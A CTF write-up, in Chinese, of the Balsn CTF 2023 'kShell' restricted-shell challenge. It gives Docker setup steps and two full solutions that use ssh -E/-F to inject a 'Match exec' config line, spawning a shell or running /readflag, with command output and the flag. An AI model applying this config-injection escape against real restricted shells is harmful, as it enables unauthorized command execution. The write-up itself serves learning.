## Background
* [[小抄] Docker 基本命令](https://yingclin.github.io/2018/docker-basic.html)
* 如果想要reproduce該題目的話，可以直接下(記得先打開docker desktop):
    ```bash
    $ docker run --rm -it $(docker build -q .) /bin/sh
    ```
    `docker build -q .`是指利用當前目錄的Dockerfile建一個instance，而Dockerfile是based on alpine這個Image，詳細可以看一下這一篇文章[^docker-alpine]，然後針對alpine linux作一些檔案搬運和權限控管，最後會運行`/start.sh`這個檔案，BTW，-q參數的意義是會把當前已經build好的instance的ID print出來，剛好可以丟給docker run當作instance id用。
    當我們build完之後就要run他，並且可以跟我們進行shell的互動(-it)參數的意義，然後開/bin/sh給我們用
    :::danger
    不可以使用/bin/bash，因為alpine只有支援sh這個shell，否則會出現一些error，詳細可以看這一篇[^docker-bug-solution]
    :::
    ---
    成功後的結果如下，接著只要運行`/kShell.py`就可以像比賽中直接開一個kshell instance一樣了
    ```bash
    $ docker run -it --rm $(docker build -q .) /bin/sh
    /home/kShell # ls
    /home/kShell # python3 /kShell.py
    Welcome to
     _    ___  _          _  _
    | |__/ __|| |_   ___ | || |
    | / /\__ \| ' \ / -_)| || |
    |_\_\|___/|_||_|\___||_||_|

    kshell~$
    ```
* 為甚麼不直接執行`kShell-wrapper.py`?
    一開始的確是想要直接運行`kShell-wrapper.py`想說可以更模擬比賽的環境與狀況，不過中間遇到太多error導致一直都不順利，我想應該還是跟我的主機環境有關係，所以我就直接用docker開instance，就不要用wrapper開，反正效果差不了多少

* [Linux Manual Page](https://man7.org/linux/man-pages/man1/ssh.1.html)
> `-E`: 後面應該要帶一個log file，它會把stderr送到這個log file，而非印出來
> `-F`: 後面應該要帶一個config file，讓ssh可以吃
* [Linux 裡的文件描述符 0，1，2， 2＞&1 究竟是什麽](https://blog.csdn.net/yzf279533105/article/details/128587714)或是[[學習筆記] Linux Command 「2>&1」 輕鬆談](https://mks.tw/2928/%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-linux-command-%E3%80%8C21%E3%80%8D-%E8%BC%95%E9%AC%86%E8%AB%87)都講得非常清楚
## Source code
[kShell - Source Code](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2023/kShell)
## Recon
這一題也是賽後解，當初看到是shell escape的題目是有想到[VimJail](https://ctftime.org/writeup/5784)或是[PicoCTF2023 Special](https://hackmd.io/@SBK6401/rkISwiMoi/%2F%40UHzVfhAITliOM3mFSo6mfA%2FH1cd5TgAs)的思路，但是完全沒有進展，無奈之下只能放棄，但放棄之前也有一些資訊:
* 他只開放幾個command可以使用，包含
    ```bash
    kshell~$ help
    Available commands: 
      help
      exit
      id
      ping
      traceroute
      ssh
      arp
      netstat
      pwd
    ```
* 當有error出現的時候會有`Meow! An error occurred!`的字樣出現，一開始會以為有甚麼樣的作用，但結果完全沒用，顆顆
* 基本上這一題也是看itiscaleb才知道怎麼解[^kshell-wp]
## Exploit
兩種解法都很相似，但我只知道大概，都是利用ssh -F接一個config file，然後用Match exec達到RCE，但Match exec是啥鬼啊，找了很多資料都沒有這東西應該說exec會去執行後面帶的command然後跳出目前的shell，啊Match呢?????
:::info
23/10/16更新:
Match是ssh config裡面的一個語法，底下也已經有更完整的想法
:::

* 解法一
    ```bash
    /home/kShell # python3 /kShell.py
    Welcome to
     _    ___  _          _  _
    | |__/ __|| |_   ___ | || |
    | / /\__ \| ' \ / -_)| || |
    |_\_\|___/|_||_|\___||_||_|

    kshell~$ ssh -E 'Match exec "sh 0<&2 1>&2" #aaa' x
    kshell~$ ssh -F 'Match exec "sh 0<&2 1>&2" #aaa' -E aaa x
    kshell~$ ssh -F aaa x
    /home/kShell # /readflag
    BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}

    # Special thanks to Orange's oShell challenge!
    ```
    提供以上解法的是DC裡面的一個`@lebrOnli`大大
    1. 它的意思是先利用`ssh -E`創造一個log file，名稱叫做`Match exec "sh 0<&2 1>&2" #aaa`，而後面的`x`就當作一般連線的host name，但反正一定是錯的
        ```bash
        $ ssh -E 'Match exec "sh 0<&2 1>&2" #aaa' x
        $ ll
        -rwxrwxrwx 1 sbk6401 sbk6401       62 Oct 16 00:01 'Match exec "sh 0<&2 1>&2" #aaa'
        $ cat Match\ exec\ \"sh\ 0\<\&2\ 1\>\&2\"\ \#aaa
        ssh: Could not resolve hostname x: Name or service not known
        ```
    2. 再利用這個log file當作config file丟給`ssh -F`，當然它會噴錯，因為裡面根本不是一般的config info
        ```bash
        $ ssh -F 'Match exec "sh 0<&2 1>&2" #aaa' -E aaa x
        $ cat aaa
        Match exec "sh 0<&2 1>&2" #aaa: line 1: Bad configuration option: ssh:
        Match exec "sh 0<&2 1>&2" #aaa: terminating, 1 bad configuration options
        ```
        此時可以看到檔案`aaa`的內容已經因為log append變成Match exec "sh 0<&2 1>&2"，而#字號後面就當作一般的comment
    3. 此時我們已經構建好config file了，則我們可以把aaa當作conig丟給ssh -F，它就會去執行裡面的內容，而實際上真正讓我們escape是因為exec，它會執行後面的東西完了以後就跳出目前的shell，然後就可以執行/readflag
* 解法二
    ```bash
    kshell~$ ssh localhost -F /proc/self/fd/1
    Match exec "/readflag>&2"
    BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}

    # Special thanks to Orange's oShell challenge!
    ```
    這個解法更省力，誠如作者所說，如果config file是一個fd呢?它就會直接讓我們輸入東西當成它的configuration，所以只要下跟上面一樣的command就會跳出來，不過@itiscaleb是直接執行然後印出來，不知道這樣的操作為啥會成功，如果是我的話會直接用`Match exec "sh 0<&2 1>&2`跳出來再執行/readflag
Flag: `BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}`
## Reference
[^docker-bug-solution]:[Docker報錯OCI runtime exec failed: exec failed: unable to start container process: exec: "/bin/bash"解決](https://blog.csdn.net/qq_35764295/article/details/126379879)
[^docker-alpine]:[Alpine Linux 挑戰最小 docker image OS](https://blog.wu-boy.com/2015/12/a-super-small-docker-image-based-on-alpine-linux/)
[^kshell-wp]:[BalsnCTF 2023 kShell WP](https://itiscaleb.com/2023/10/Balsn-CTF-2023/)